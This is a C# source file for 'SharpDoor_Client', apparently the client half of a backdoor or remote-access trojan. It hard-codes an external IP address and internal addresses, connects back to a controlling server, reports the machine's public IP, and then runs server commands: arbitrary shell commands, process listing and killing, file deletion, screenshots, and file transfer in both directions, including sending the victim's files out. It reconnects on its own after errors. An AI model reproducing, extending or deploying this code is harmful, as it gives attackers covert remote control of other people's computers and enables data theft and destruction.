using System;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Threading;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Diagnostics;
using System.ComponentModel.Design.Serialization;

namespace SharpDoor_Client    //Client side console app
{

    class Program
    {
        public static int Execute_Command(string command, NetworkStream stream, string directory, TcpClient client)    //Executes a command from the server
        {
            if (command == "exit")  //Shutsdown the client
            {
                SupportFuncLib.Shutdown();
                return 1;
            }
            else if (command.Contains("server -port -change:")) //Change the port to a supported port
            {
                int port = int.Parse(command[21..command.Length]);
                return port;
            }
            else if (command == "client -screenshot")
            {
                SupportFuncLib.Screenshot(stream, client);
                return 0;
            }

            else if (command == "task -ls")     //Take a list of all running process and their id's and send to server
            {
                string shell_command = "tasklist";
                string return_value = SupportFuncLib.ShellInjection(shell_command);
                Send(stream, return_value);
                return 0;
            }
            else if (command == "ls")   //Analyze for the ls function
            {
                string shell_command = "dir";
                string return_value = SupportFuncLib.ShellInjection(shell_command);
                Send(stream, return_value);
                return 0;
            }
            else if (command.Contains("cd "))       //Change the working directory
            {
                int cLength = command.Length;
                string path = command[3..cLength];      //find new path
                int pathCheck = SupportFuncLib.ChangeDirectory(path);
                if (pathCheck == 0)     //if path changed properly notify server
                {
                    Send(stream, "PATH CHANGED");
                    return 0;
                }
                else
                {
                    Send(stream, "PATH NOT FOUND");
                    return 0;
                }
            }
            else if (command.Contains("dl "))   //Upload a file to server
            {
                string filename = command[3..command.Length];
                int rV = Upload(stream, client, filename);
                return 0;
            }
            else if (command.Contains("upld ")) //Download a file from server
            {
                string filename = command[5..command.Length];
                int rV = Download(stream, client, filename);
                return 0;
            }
            else if (command.Contains("task -killall "))        //kills all processes with a specific name
            {
                string proc = command[14..command.Length];
                int killedProcs = SupportFuncLib.KillProcName(proc);
                string toSend = "Killed " + killedProcs + " processes with the name " + proc + " on the target";
                Send(stream, toSend);
                return 0;
            }
            else if (command.Contains("task -kill "))       //kills a process on target computer
            {
                int cLength = command.Length;
                string PID = command[11..cLength];

                int pid = int.Parse(PID);
                int check = SupportFuncLib.KillProcess(pid);
                if (check == 0)     //checks if process was killed succesfully and sends result to server
                {
                    Send(stream, "Succesfuly killed procId: " + PID);
                }
                else
                {
                    Send(stream, "Could not locate procId: " + PID + " on target");
                }
                return 0;
            }
            else if (command.Contains("shell "))        //Inject a shell command on the target system
            {
                int cLength = command.Length;
                string shell_command = command[6..cLength];
                string output = SupportFuncLib.ShellInjection(shell_command);
                Send(stream, output);
                return 0;
            }
            else if (command.Contains("del "))      //Deletes a file or folder within the current working directory
            {
                int cLength = command.Length;
                string fileToDelete = command[4..cLength];
                int output = SupportFuncLib.DeleteF(fileToDelete);
                if (output == 0)        //Checks if the file or folder was deleted succesfully and returns the info to the server
                {
                    string toSend = "Succesfully deleted " + fileToDelete + " off target";
                    Send(stream, toSend);
                }
                else
                {
                    string toSend = "Could not locate " + fileToDelete + " in current working directory";
                    Send(stream, toSend);
                }
                return 0;
            }
            else
            {
                Console.WriteLine("Unrecognized command " + command);
                return 1;
            }
        }
        public static int Download(NetworkStream stream, TcpClient client, string filename)     //Downloads a file from the server over the network stream
        {
            //Declaration of variables
            int bytesRead = 0;int buffer = 4096; int x = 0; int f = 0;
            string root = Directory.GetCurrentDirectory();
            while (x < 1)   
            {
                string path = @root + "\\" + filename;
                if (File.Exists(path))      //Check if file exists and if so slightly change the name of it
                {
                    filename = f.ToString() + filename;
                    f += 1;
                }
                else
                {
                    string fS = Receive(stream, client);        //Receive the size of the file
                    int fileSize = int.Parse(fS);       //Parse the size to a int
                    byte[] bytesToRead = new byte[fileSize];        //create a byte array of the size filesize
                    while (bytesRead < bytesToRead.Length)      // while loop for download
                    {
                        if ((bytesRead + buffer) > bytesToRead.Length)      //To adjust buffer in case of buffer overflow
                        {
                            buffer = bytesToRead.Length - bytesRead;
                        }
                        stream.Read(bytesToRead, bytesRead, bytesRead + buffer);        //Read the bytes from the stream
                        Console.WriteLine("Read "+buffer+" bytes from server");
                        bytesRead += buffer;
                    }
                    var fs = new FileStream(filename, FileMode.Create, FileAccess.Write);   //write the bytes to a file
                    fs.Write(bytesToRead, 0, bytesToRead.Length);
                    fs.Close();
                    Send(stream, "Succesfully uploaded file " + filename + " to target");       //Send a confirmation message
                    x += 1;
                }
                
            }
            return 0;
        }
        public static int Upload(NetworkStream stream, TcpClient client, string filename)
        {
            int bytesSent = 0;int buffer = 4096;    //Declairing variables
            string root = Directory.GetCurrentDirectory();
            string full_path = @root+"\\"+filename;
            if (File.Exists(full_path))     //if file exists in directory upload to server
            {
                Send(stream, "FILE FOUND");
                Thread.Sleep(100);
                byte[] bytesToSend = File.ReadAllBytes(full_path);      //Read the files bytes
                Send(stream, bytesToSend.Length.ToString());        //Send the length of the file
                Thread.Sleep(100);
                while (bytesSent < bytesToSend.Length)  //Upload loop
                {
                    if ((bytesSent + buffer) > bytesToSend.Length)      //Edit buffer if it is larger than possible buffer
                    {
                        buffer = bytesToSend.Length - bytesSent;
                    }
                    stream.Write(bytesToSend, bytesSent, buffer);   //Write data to network stream
                    bytesSent += buffer;
                }
                Receive(stream, client);        //Confirm it has been written on server
                return 0;
            }
            else        //If file is not in directory notify server and end stream
            {
                Send(stream, "FILE NOT FOUND");
                return 1;
            }
        }
        public static string Receive(NetworkStream stream, TcpClient client)    //Receives a message from the server
        {
            byte[] bytesToRead = new byte[client.ReceiveBufferSize];
            int bytesRead = stream.Read(bytesToRead, 0, client.ReceiveBufferSize);
            string message = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
            return message;
        }

        public static void Send(NetworkStream stream, string message)   //Sends a message to the server
        {
            byte[] sendData = Encoding.ASCII.GetBytes(message);
            stream.Write(sendData, 0, sendData.Length);
            return;
        }
        static void Main()     //CLIENT MAIN FUNCTION
        {
            //  INITIALIZE IP ADDRESSES FOR CONNECTION
            string EXTHOSTADDR = "198.84.206.27";
            string INTADDR1 = "192.168.1.105";
            string INTADDR2 = "192.168.0.14";
            List<int> PORTS = SupportFuncLib.GetPorts();    //Gather Ports list

            reboot: //reboot exception catcher
            int PORT = 0;
            try
            {
                port_change:      //Port change label
                TcpClient client = new TcpClient(INTADDR1, PORTS[PORT]);   //Create TCP Connection with server
                NetworkStream stream = client.GetStream();
                string ipv4 = SupportFuncLib.GetExternalIpv4();     //Store Public IPV4 to a string
                Send(stream, ipv4);     //Send Public IPV4 to server

                //MAIN CONNECTION LOOP
                int command_loop = 0;
                while (command_loop < 1)
                {
                    string path = Directory.GetCurrentDirectory();      //Get current working directory and send to the server
                    Send(stream, path);
                    string command = Receive(stream, client);       //Receive command from server
                    Console.WriteLine(command);     //DEBUG SETTING
                    int return_value = Execute_Command(command, stream, path, client);     //Execute commad from the server
                    if (return_value == 0)
                    {
                        command_loop = 0;       //Continue command
                    }
                    //Port change catch
                    else if (return_value == 88) { PORT = 0;client.Close();stream.Close();goto port_change; }
                    else if (return_value == 22) { PORT = 1;client.Close();stream.Close();goto port_change; }
                    else if (return_value == 360) { PORT = 2; client.Close(); stream.Close(); goto port_change; }
                    else if (return_value == 8000) { PORT = 3; client.Close(); stream.Close(); goto port_change; }
                    else if (return_value == 8080) { PORT = 4; client.Close(); stream.Close(); goto port_change; }
                    else
                    {
                        command_loop = 1;
                    }

                }
                SupportFuncLib.Shutdown();      //Shutsdown the client if command returns value 1
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.WriteLine("Failed to connect...");
                goto reboot;
            }
        }
    }

}
